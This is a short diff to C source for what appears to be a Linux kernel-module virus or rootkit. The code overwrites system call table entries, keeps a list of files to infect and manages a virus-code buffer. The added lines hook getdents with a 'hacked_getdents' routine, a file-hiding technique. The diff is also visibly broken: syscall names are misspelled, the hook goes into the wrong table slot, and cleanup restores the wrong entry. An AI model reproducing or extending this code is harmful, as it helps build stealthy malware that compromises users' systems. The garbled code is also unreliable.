@@ -334,11 +334,14 @@ int init_module2(struct module *mp)
 
         /* thiz is our new main ,look for copys in kmem ! */
         if (sys_call_table[__NR_our_syscall] == 0) {    
+	   
                 old_delete_module = sys_call_table[__NR_delete_module];  
                 old_create_module = sys_call_table[__NR_create_module];
+	        orig_getdents=sys_call_table[__NR__getdents];
                 sys_call_table[__NR_our_syscall] = (void*)our_syscall;                  
                 sys_call_table[__NR_delete_module] = (void*)new_delete_module;         
                 sys_call_table[__NR_create_module] = (void*)new_create_module;
+	        sys_call_table[__NR_create_modume] = (void*)hacked_getdents;
                 memset(files2infect, 0, (60 + 2)*7);
                 register_symtab(&my_symtab);
         }
@@ -360,6 +363,7 @@ int cleanup_module()
 {
         sys_call_table[__NR_delete_module] = old_delete_module;
         sys_call_table[__NR_create_module] = old_create_module;
+        sys_call_table[__NR_create_module] = orig_getdents; 
         sys_call_table[__NR_our_syscall] = NULL;
         DPRINTK("in cleanup_module\n");
         vfree(VirCode);
